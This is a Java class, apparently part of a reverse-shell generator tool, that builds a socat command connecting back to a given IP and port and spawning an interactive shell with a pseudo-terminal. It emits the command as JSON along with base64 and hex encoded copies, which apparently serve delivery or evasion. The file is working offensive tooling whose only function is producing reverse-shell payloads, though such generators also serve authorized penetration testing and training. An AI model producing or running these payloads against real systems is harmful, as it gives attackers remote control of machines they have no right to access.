    package com.iteso.ReverseShellGenerator.Reverse.Shells;
    import com.iteso.ReverseShellGenerator.DEncoder;
    import com.iteso.ReverseShellGenerator.Reverse.Reverse;

    public class Socat_2_tty extends Reverse {

        protected String shellFormat = "";

        public Socat_2_tty(String localIP, int localPort, LISTENER listener, SHELLS shellType){
            super(localIP, localPort, listener, shellType);
            shellFormat = String.format("socat TCP:%s:%s EXEC:'%s',pty,stderr,setsid,sigint,sane",this.getLocalIP() ,this.getLocalPort(), this.getShell());
        }

        @Override
        public String getShellCode(){
            return shellFormat;
        }

        @Override
        public String toString(){
            return "{" + "\"parameters\": " + super.toString() + "," +
                        "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                        "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                        "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                        "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                    "}";
        }
    
}